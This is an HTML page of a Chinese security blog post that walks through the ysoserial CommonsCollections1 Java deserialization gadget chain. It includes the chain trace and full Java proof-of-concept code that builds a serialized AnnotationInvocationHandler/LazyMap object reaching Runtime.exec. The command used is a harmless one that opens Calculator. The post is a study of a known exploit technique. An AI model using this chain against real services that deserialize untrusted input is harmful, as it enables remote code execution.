@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言在学习CommonsCollection1前先认识一下以下的这些接口和类. Transformer Transformer接口定义了transform方法, 接收一个Object类型的参数 ConstantTransformer 其类实现了上述的Transformer接口, 在构造方法中接收一个对象, 在transform方法中返回这个对象。 InvokerTransformer Invoke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ysoserial之CommonsCollections1 - P2">
+<meta property="og:url" content="http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/index.html">
+<meta property="og:site_name" content="Search is Null">
+<meta property="og:description" content="前言在学习CommonsCollection1前先认识一下以下的这些接口和类. Transformer Transformer接口定义了transform方法, 接收一个Object类型的参数 ConstantTransformer 其类实现了上述的Transformer接口, 在构造方法中接收一个对象, 在transform方法中返回这个对象。 InvokerTransformer Invoke">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1gmd7dlk9vpj31ed0u07d3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmiob6k6wmj30tu07cdgu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmjpjydxwwj31j20gaq8t.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmjsqb81e4j31ks0ruasc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm5tse9awj31co0eidir.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm5yr2e75j30xz0u0n4c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm664vl3pj30xk0amwg5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gmn2jfj5gcj31s70u0kfk.jpg">
+<meta property="article:published_time" content="2021-01-14T07:52:59.000Z">
+<meta property="article:modified_time" content="2021-01-16T14:13:33.717Z">
+<meta property="article:author" content="Search?&#x3D;Null">
+<meta property="article:tag" content="Java反序列化">
+<meta property="article:tag" content="ysoserial">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1gmd7dlk9vpj31ed0u07d3.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ysoserial之CommonsCollections1 - P2</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Search is Null" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/16/ysoserial%E4%B9%8BCommonsCollections2-7-P3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/01/05/ysoserial%E4%B9%8BURLDNS-P1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&text=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&is_video=false&description=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ysoserial之CommonsCollections1 - P2&body=Check out this article: http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&name=ysoserial之CommonsCollections1 - P2&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&t=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例分析"><span class="toc-number">2.</span> <span class="toc-text">实例分析</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ysoserial之CommonsCollections1 - P2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Search is Null</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-14T07:52:59.000Z" itemprop="datePublished">2021-01-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Java反序列化</a>, <a class="tag-link" href="/tags/ysoserial/" rel="tag">ysoserial</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在学习CommonsCollection1前先认识一下以下的这些接口和类.</p>
+<p><strong>Transformer</strong></p>
+<p>Transformer接口定义了transform方法, 接收一个Object类型的参数</p>
+<p><strong>ConstantTransformer</strong></p>
+<p>其类实现了上述的Transformer接口, 在构造方法中接收一个对象, 在transform方法中返回这个对象。</p>
+<p><strong>InvokerTransformer</strong></p>
+<p>InvokerTransformer类同样实现了Transformer接口, 具体解释如下图所示, InvokerTransformer的transform方法通过反射调用其方法。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gmd7dlk9vpj31ed0u07d3.jpg" alt="image-20210105224732589"></p>
+<p><strong>ChainedTransformer</strong></p>
+<p>同样实现Transformer接口, 该类的构造方法接收一个Transformer对象的数组。在transform方法中循环调用Transformer数组中每个对象的transform方法。将上一个transform方法的返回结果作为下一个调用的参数</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmiob6k6wmj30tu07cdgu.jpg" alt="image-20210110162111261"></p>
+<hr>
+<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>基于上述介绍的对象实现命令执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下代码摘自@p1g3</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码可能稍有复杂, 这块需要多多巩固<code>Java反射</code>。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmjpjydxwwj31j20gaq8t.jpg" alt="image-20210111134949455"></p>
+<p>针对上图的内容再做一次文字解释, 希望读者能够在阅读本文的时候避免笔者踩的坑。</p>
+<p>首先实例化了一个<code>ChainedTransformer</code>对象, 传入的<code>Transformer</code>数组一共有四个元素, 其中除了第一个元素是<code>ConstantTransformer</code>对象外其他三个均为<code>InvokerTransformer</code>对象。</p>
+<p>在代码的20行处调用了<code>ChainedTransformer</code>的<code>transform</code>方法, 其首先调用<code>ConstantTransformer</code>的<code>transform</code>方法传入的参数为<code>123</code>, 该方法会返回一个<code>Runtime</code>的Class对象作为调用<code>InvokerTransformer</code>对象<code>transform</code>方法的参数。根据实例化对象时传入的参数, 该方法便会调用<code>Class</code>类的<code>getMethod</code>方法返回一个<code>Method</code>对象, 继续重复上面的步骤。传入<code>Method</code>对象调用其invoke方法获得<code>Runtime</code>类的对象。最终在循环到第四个元素是便会调用<code>exec</code>方法执行命令了, 结果如下图所示。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmjsqb81e4j31ks0ruasc.jpg" alt="image-20210111153941307"></p>
+<hr>
+<p><strong>CommonsCollections1 Gadget Chain</strong></p>
+<p>通过上面的实例分析已经能够获取一条执行任意命令的链了, 但在上述的分析中我们是基于代码本身去主动调用的transform方法, 因此在真实的反序列化漏洞场景中, 需要找到一个能够直接/间接调用transform的gadget。在ysoserial中使用的是AnnotationInvocationHandler类。通过其的readObject方法和动态代理实现调用LazyMap的get方法触发gadget。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 摘自ysoserial</span></span><br><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>在<code>AnnotationInvocationHandler</code>类的readObject方法中调用了memberValues成员变量的entrySet方法, memberValues不被transient或static关键字修饰。所以该属性我们是可控的。并且<code>AnnocationInvocationHandler</code>类实现了InvocationHandler接口与invoke方法。所以该类可作为动态代理使用。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm5tse9awj31co0eidir.jpg" alt="image-20210113164357331"></p>
+<p>在invoke方法中又调用了memberValue的get方法：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm5yr2e75j30xz0u0n4c.jpg" alt="image-20210113164845783"></p>
+<p>在LazyMap的get方法中调用了transform方法从而实现上面的手动利用链, 这里的factory属性是可控的。所以只要令factory为ChainedTransformer就能完成命令执行的利用链。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmm664vl3pj30xk0amwg5.jpg" alt="image-20210113165551905"></p>
+<p>代码实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /System/Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chain);</span><br><span class="line">        <span class="comment">// 反射获取AnnotationInvocationHandler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler_invocation = (InvocationHandler) handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line">        Map map_proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">handler_invocation</span>)</span>;</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler对象</span></span><br><span class="line">        Constructor annotation_invocation_handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        annotation_invocation_handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler annotation_invocation_handler = (InvocationHandler) annotation_invocation_handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map_proxy</span>)</span>;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"cc1"</span>));</span><br><span class="line">        oos.writeObject(annotation_invocation_handler);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"cc1"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gmn2jfj5gcj31s70u0kfk.jpg" alt="image-20210114113547843"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例分析"><span class="toc-number">2.</span> <span class="toc-text">实例分析</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&text=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&is_video=false&description=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ysoserial之CommonsCollections1 - P2&body=Check out this article: http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&title=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&name=ysoserial之CommonsCollections1 - P2&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/14/ysoserial%E4%B9%8Bcommonscollections1-p2/&t=ysoserial之CommonsCollections1 - P2" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Search?=Null
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
